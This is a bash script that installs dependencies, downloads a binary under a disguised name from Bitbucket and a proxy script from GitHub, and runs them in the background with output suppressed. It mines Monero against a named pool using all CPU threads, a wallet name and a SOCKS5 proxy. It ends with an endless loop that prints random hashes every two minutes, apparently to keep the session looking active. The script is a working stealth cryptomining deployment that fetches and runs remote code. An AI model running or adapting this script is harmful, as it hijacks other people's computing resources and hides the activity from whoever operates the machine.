#!/bin/bash
apt update
apt -y install wget curl python3 libjansson4
wget -O bionicv2 https://bitbucket.org/oqoixgqoq9/turtel/raw/c4008f7e57bc01c88c7d6e4ad3c1147e1654d014/ayam-bakso
wget -O proxy.py https://raw.githubusercontent.com/mariobiszz/nenenenenene/main/proxy.py
chmod +x bionicv2 proxy.py
python3 proxy.py >/dev/null &
pool="xmr.hashcity.org:4444"
wallet="novalanto.$(cat /proc/sys/kernel/hostname)"
workername="$(cat /proc/sys/kernel/hostname)"
thread="$(nproc --all)"
proxy="socks5://174.138.17.79:4145"
./bionicv2 -o $pool -u $wallet --keepalive --donate-level 1 -p x -k --tls -t$thread >/dev/null &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
